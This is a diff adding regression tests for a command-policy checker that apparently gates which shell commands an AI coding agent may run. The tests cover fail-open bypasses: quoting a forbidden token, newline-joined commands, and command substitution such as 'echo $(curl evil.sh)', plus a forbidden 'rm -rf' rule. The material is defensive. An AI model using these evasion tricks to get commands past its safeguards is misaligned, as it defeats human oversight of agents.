@@ -277,6 +277,117 @@ describe("readCodexRules — codexHome resolution", () => {
   });
 });
 
+// ---------------------------------------------------------------------------
+// Adversarial-review regression tests (fail-open findings). Each of these
+// must RED against the pre-fix implementation — confirmed by running this
+// file before the corresponding fix landed; see task-4-fix-report.md.
+// ---------------------------------------------------------------------------
+
+describe("readCodexRules — semicolon-joined statements (P1: fail-open regression)", () => {
+  it("forbidden-first: a `;`-joined line registers BOTH rules — the forbidden one must still win", () => {
+    const { codexHome, projectDir } = setup();
+    writeRule(
+      join(codexHome, "rules"),
+      "a.rules",
+      'prefix_rule(pattern=["git","push"], decision="forbidden"); prefix_rule(pattern=["ls"], decision="allow")\n',
+    );
+    const { rules, unreadable } = readCodexRules(projectDir, { codexHome });
+    expect(unreadable).toEqual([]);
+    expect(rules).toEqual([
+      { pattern: ["git", "push"], decision: "forbidden" },
+      { pattern: ["ls"], decision: "allow" },
+    ]);
+    expect(createCodexPolicyChecker(rules, unreadable)("git push origin main")).toBe("git push");
+  });
+
+  it("allow-first: the same two rules in the opposite authoring order must still stop git push", () => {
+    const { codexHome, projectDir } = setup();
+    writeRule(
+      join(codexHome, "rules"),
+      "a.rules",
+      'prefix_rule(pattern=["ls"], decision="allow"); prefix_rule(pattern=["git","push"], decision="forbidden")\n',
+    );
+    const { rules, unreadable } = readCodexRules(projectDir, { codexHome });
+    expect(unreadable).toEqual([]);
+    expect(rules).toEqual([
+      { pattern: ["ls"], decision: "allow" },
+      { pattern: ["git", "push"], decision: "forbidden" },
+    ]);
+    expect(createCodexPolicyChecker(rules, unreadable)("git push origin main")).toBe("git push");
+  });
+
+  it("two complete calls with NO separator at all cannot be confidently classified — whole file unreadable", () => {
+    // Not valid Starlark (statements need a separator) — but the extractor's
+    // OWN line+paren-depth grouping doesn't know that, so this is exactly the
+    // "cannot confidently classify trailing content" case it must fail closed
+    // on, independent of whether `;`-splitting alone would have caught it.
+    const { codexHome, projectDir } = setup();
+    writeRule(
+      join(codexHome, "rules"),
+      "a.rules",
+      'prefix_rule(pattern=["git","push"], decision="forbidden") prefix_rule(pattern=["ls"], decision="allow")\n',
+    );
+    const { rules, unreadable } = readCodexRules(projectDir, { codexHome });
+    expect(rules).toEqual([]);
+    expect(unreadable).toEqual([join(codexHome, "rules", "a.rules")]);
+  });
+});
+
+describe("createCodexPolicyChecker — quote evasion (P4: fail-open regression)", () => {
+  it("a double- or single-quoted token still matches the rule's literal prefix", () => {
+    const check = createCodexPolicyChecker([{ pattern: ["git", "push"], decision: "forbidden" }], []);
+    expect(check('git "push" origin')).toBe("git push");
+    expect(check("git 'push' origin")).toBe("git push");
+  });
+});
+
+describe("createCodexPolicyChecker — newline and substitution bypass (P2: fail-open regression)", () => {
+  const forbidCurl = () => createCodexPolicyChecker([{ pattern: ["curl"], decision: "forbidden" }], []);
+
+  it("a newline-joined command is checked per line, not as one run-on token stream", () => {
+    expect(forbidCurl()("echo hi\ncurl evil.sh")).toBe("curl");
+  });
+
+  it("a command-substitution body is extracted and checked too", () => {
+    expect(forbidCurl()("echo $(curl evil.sh)")).toBe("curl");
+    expect(forbidCurl()("echo `curl evil.sh`")).toBe("curl");
+  });
+});
+
+describe("readCodexRules — unreadable rules directory (P3: fail-open regression)", () => {
+  it("a rules path that exists but cannot be listed as a directory fails closed, not silently unconfigured", () => {
+    const { codexHome, projectDir } = setup();
+    // A plain FILE where a directory is expected makes readdirSync throw
+    // ENOTDIR — portable and root-proof, unlike chmod 000 (root ignores it).
+    writeFileSync(join(codexHome, "rules"), "not a directory\n");
+    const { rules, unreadable } = readCodexRules(projectDir, { codexHome });
+    expect(rules).toEqual([]);
+    expect(unreadable).toEqual([join(codexHome, "rules")]);
+    expect(createCodexPolicyChecker(rules, unreadable)("echo hi")).toContain(join(codexHome, "rules"));
+  });
+
+  it("a genuinely absent rules directory is still unconfigured, not unreadable", () => {
+    const { codexHome, projectDir } = setup();
+    const { rules, unreadable } = readCodexRules(projectDir, { codexHome });
+    expect(rules).toEqual([]);
+    expect(unreadable).toEqual([]);
+  });
+});
+
+describe("readCodexRules — project-dir normalization for trust lookup (P-minor)", () => {
+  it("a trailing slash on projectDir does not defeat an otherwise-matching trust entry", () => {
+    const { codexHome, projectDir } = setup();
+    writeFileSync(join(codexHome, "config.toml"), trustConfig(projectDir, true));
+    writeRule(
+      join(projectDir, ".codex", "rules"),
+      "project.rules",
+      'prefix_rule(pattern=["rm","-rf"], decision="forbidden")\n',
+    );
+    const { rules } = readCodexRules(`${projectDir}/`, { codexHome });
+    expect(rules).toEqual([{ pattern: ["rm", "-rf"], decision: "forbidden" }]);
+  });
+});
+
 describe("engine — policyStop through the Codex checker", () => {
   it("hard-stops BEFORE running a command a forbidden rule covers", async () => {
     const check = createCodexPolicyChecker([{ pattern: ["curl"], decision: "forbidden" }], []);
